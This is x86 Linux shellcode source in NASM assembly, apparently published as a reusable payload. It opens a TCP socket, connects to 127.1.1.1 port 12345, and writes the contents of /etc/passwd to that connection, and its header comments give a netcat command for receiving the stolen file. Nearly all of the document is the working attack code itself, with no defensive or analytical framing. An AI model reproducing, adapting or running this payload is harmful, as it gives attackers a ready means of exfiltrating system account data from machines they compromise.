; Author: Daniel Sauder
; Website: http://govolution.wordpress.com/about
; License http://creativecommons.org/licenses/by-sa/3.0/

; Shellcode reads /etc/passwd and sends the content to 127.1.1.1 port 12345. 
; The file can be recieved using netcat:
; $ nc -l 127.1.1.1 12345

section .text

global _start

_start:
    ; socket
    push BYTE 0x66    ; socketcall 102
    pop eax
    xor ebx, ebx 
    inc ebx 
    xor edx, edx
    push edx 
    push BYTE 0x1
    push BYTE 0x2
    mov ecx, esp
    int 0x80
    mov esi, eax

    ; connect
    push BYTE 0x66 
    pop eax
    inc ebx
    push DWORD 0x0101017f  ;127.1.1.1
    push WORD 0x3930  ; Port 12345
    push WORD bx
    mov ecx, esp
    push BYTE 16
    push ecx
    push esi
    mov ecx, esp
    inc ebx
    int 0x80

    ; dup2
    mov esi, eax
    push BYTE 0x1
    pop ecx
    mov BYTE al, 0x3F
    int 0x80
    
    ;read the file
    jmp short call_shellcode
    
shellcode:
    push 0x5
    pop eax
    pop ebx
    xor ecx,ecx
    int 0x80
    mov ebx,eax
    mov al,0x3
    mov edi,esp
    mov ecx,edi
    xor edx,edx
    mov dh,0xff
    mov dl,0xff
    int 0x80
    mov edx,eax
    push 0x4
    pop eax
    mov bl, 0x1
    int 0x80
    push 0x1
    pop eax
    inc ebx
    int 0x80
    
call_shellcode:
    call shellcode
    message db "/etc/passwd"
